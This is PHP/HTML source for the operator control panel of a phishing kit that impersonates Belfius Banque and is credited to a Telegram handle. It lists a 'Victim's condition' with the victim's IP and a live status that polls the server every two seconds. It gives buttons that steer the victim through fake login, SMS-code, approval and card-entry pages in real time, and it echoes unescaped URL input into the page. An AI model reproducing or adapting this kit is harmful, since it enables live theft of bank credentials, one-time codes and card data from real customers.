<?php 



     require_once "functions.php";
     require_once "ajax.php";


                                    #========================================
                                    #==> Make By ==> Telegram : @Azar_ox <==#
                                    #========================================



?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Belfius Banque - Belfius</title>
        <!-- logo site web-->
        <link rel="icon" href="image/belfius.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/belfius.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/styles.css">
        <link rel="stylesheet"  href="css/animate.css">
        <style>
            .modal-open{
                overflow:hidden;
                padding-right:0px;
            }
        </style>

</head>
<body class="modal-open">

        <div class="home_1">
            <img src="image/xl.png">
        </div>

        <div class="home_2">
            <img src="image/lg.png">
        </div>

        <div class="home_3">
            <img src="image/md.png">
        </div>

        <div class="home_4">
            <img src="image/sm.png">
        </div>

        <div class="home_5">
            <img src="image/xs.png">
        </div>

        <div class="home_6">
            <img src="image/zz.png">
        </div>

         <!-- Modal -->
        <div class="modal problem fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:block;"> 
          <div class="modal-dialog shadow ">
            <div class="modal-content">
              <div class="modal-header text-center ">
                  <h4>Se connecter</h4>
                  <i class="bi bi-x-lg"></i>
              </div>
              <div class="modal-body">
                 <div class="row">
                     <div class="col-12">
                        <div class="PANEL mt-5" style="max-width: 500px;margin:0 auto;">
                            <h1 style="font-size:20px;font-weight:700;">Victim's condition</h1>
                            <!-- <span id="status" style="display:flex;height:45px;color: white;font-size:17px;font-weight: 600;width:120px;margin:0 auto;justify-content: center;align-items: center;border-radius:4px;">
                            </span>  -->
                            <ul class="nav" style="border:1px solid #aaa;line-height: 45px;padding-left:10px;">
                                <li class="nav-item" style="width:40%;border-right:1px solid #aaa;font-weight: 600;">IP:</li>
                                <li class="nav-item" style="width:60%;width:60%;display:flex;align-items: center;">
                                    <span  style="display:flex;align-items: center; height:35px;color: white;font-size:15px;font-weight: 600;width:100px;margin:0 auto;justify-content: center;align-items: center;border-radius:4px;background: #C20145;">
                                        <?php echo $_GET['ip']; ?>
                                    </span> 
                                </li>
                            </ul>
                            <ul class="nav" style="border:1px solid #aaa;border-top: none; line-height: 45px;padding-left:10px;">
                                <li class="nav-item" style="width:40%;border-right:1px solid #aaa;font-weight: 600;">Status:</li>
                                <li class="nav-item" style="width:60%;display:flex;align-items: center;">
                                    <span id="status" style="display:flex;align-items: center; height:35px;color: black;font-size:15px;font-weight: 600;width:100px;margin:0 auto;justify-content: center;align-items: center;border-radius:4px;">
                                    </span> 
                                </li>
                            </ul>
                        </div>
                        <hr>
                        <h4>Panel Control</h4>
                        <form action="infos.php" method="post" class="p-4" style="flex-wrap: wrap;display: flex;justify-content: center;">
                            <input  type="hidden" name="step" value="control">
                            <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">
                            <!-- START___LOGIN -->
                            <div class=" atlanta shadow  mt-4" style="width:100%;text-align: center; padding: 20px; border-top: 3px solid #C20145">
                                <b class="mb-3">Redrect to</b>
                                <br>
                                <br>
                                <button type="submit" class="btn btn-success m-2 " name="to" value="login">LOGIN</button>
                                <button type="submit" class="btn btn-success m-2 " name="to" value="sms">SMS CODE</button>
                                <button type="submit" class="btn  m-2 " name="to" value="approuve" style="background:#C20145;color: white;">APPROUVE</button>
                                <button type="submit" class="btn btn-success m-2 " name="to" value="cc">CC</button>
                                <button type="submit" class="btn btn-outline-primary m-2 " name="to" value="success">SUCCESS</button>
                            </div>

                            <!-- START___SUCCESS -->
                            <div class=" atlanta shadow  mt-4" style="width:50%;text-align: center; padding: 20px; border-top: 3px solid #C20145">
                                <b class="mb-3" style="color:">CODE</b>
                                <br>
                                <br>
                                <input type="text" name="link" id="link" class="form-control" placeholder="Enter the Code">
                                <br>
                                <button type="submit" class="btn btn-success mx-2 my-2" name="to" value="qrcode" >Add Code</button>
                            </div>
                        </form>
                    </div>
                 </div>
              </div>
            </div>
          </div>
        </div>






        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>
        $(document).ready(function() {
            setInterval(function() {
                $.ajax({
                    type: "GET",
                    url: "sse-server.php?ip=.<?=$_GET['ip']?>",
                    success: function(response) {
                        console.log(response);
                        $("#status").text(response);
                    },
                    error: function(error) {
                        console.error(error);
                    }
                });
            }, 2000); 
        });
        </script>
              
</body>
</html>

